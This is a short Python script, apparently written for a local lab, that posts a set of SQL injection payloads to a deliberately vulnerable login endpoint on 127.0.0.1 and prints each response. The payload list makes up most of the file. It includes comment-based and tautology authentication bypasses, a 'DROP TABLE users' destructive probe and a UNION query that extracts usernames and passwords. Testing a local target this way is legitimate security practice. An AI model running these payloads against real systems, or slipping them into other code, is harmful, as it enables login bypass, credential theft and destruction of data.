"""
Real SQL Injection Attacker
Sends actual HTTP requests with real SQLi payloads against vulnerable_sqli_target.py
Every request is real — target executes the real (unsafe) query and logs the real outcome.
"""
import requests
import time

TARGET = "http://127.0.0.1:5001/login"

# Real, working SQLi payloads — classic auth bypass + error-based probing
PAYLOADS = [
    {"username": "mudasir", "password": "wrongpass"},                     # baseline normal fail
    {"username": "admin", "password": "wrongpass"},                       # baseline normal fail
    {"username": "admin' --", "password": "anything"},                    # comment-based bypass
    {"username": "admin'--", "password": "x"},                            # comment-based, no space
    {"username": "' OR '1'='1", "password": "' OR '1'='1"},               # classic tautology bypass
    {"username": "' OR 1=1--", "password": "x"},                          # tautology + comment
    {"username": "nonexistent' OR '1'='1'--", "password": "x"},           # bypass via OR
    {"username": "admin'; DROP TABLE users;--", "password": "x"},         # destructive probe (SQLite may block multi-statement via execute(), testing error response)
    {"username": "' UNION SELECT 1,username,password FROM users--", "password": "x"},  # UNION-based extraction attempt
    {"username": "mudasir'#", "password": "x"},                           # hash-comment variant
]

def main():
    for i, payload in enumerate(PAYLOADS, 1):
        try:
            r = requests.post(TARGET, data=payload, timeout=3)
            print(f"[{i}] user='{payload['username']}' -> {r.status_code} {r.json()}")
        except requests.exceptions.ConnectionError:
            print("[!] Target not running — start vulnerable_sqli_target.py first")
            return
        time.sleep(0.4)

    print("[-] SQLi payload sweep complete")

if __name__ == "__main__":
    main()
